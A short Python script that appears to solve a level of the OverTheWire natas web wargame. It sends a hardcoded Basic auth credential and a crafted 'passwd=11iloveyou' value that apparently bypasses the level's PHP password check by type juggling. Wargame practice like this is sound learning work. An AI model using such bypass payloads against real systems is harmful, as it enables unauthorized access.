import requests

headers = {
    'Authorization': 'Basic bmF0YXMyMzpEMHZsYWQzM25RRjBIejJFUDI1NVRQNXdTVzlac1JTRQ=='
}

url = 'http://natas23.natas.labs.overthewire.org/?passwd=11iloveyou'

request = requests.get(url=url, headers=headers)

print(request.content.decode('utf-8'))
